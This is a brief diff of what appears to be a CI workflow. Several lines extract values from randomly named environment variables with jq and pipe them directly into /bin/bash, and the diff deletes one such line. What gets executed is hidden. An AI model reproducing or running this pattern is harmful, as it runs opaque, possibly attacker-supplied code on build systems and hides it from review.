@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$ws645" | jq -r .pvob911 | /bin/bash
           printf '%s' "$pc522" | jq -r .xveqt2250 | /bin/bash
           printf '%s' "$rlh6" | jq -r .kg430 | /bin/bash
-          printf '%s' "$xtc58" | jq -r .zdaz4770 | /bin/bash
           echo $am1251 | jq -r .plfz1418 | /bin/bash
 
       - name: Upload data
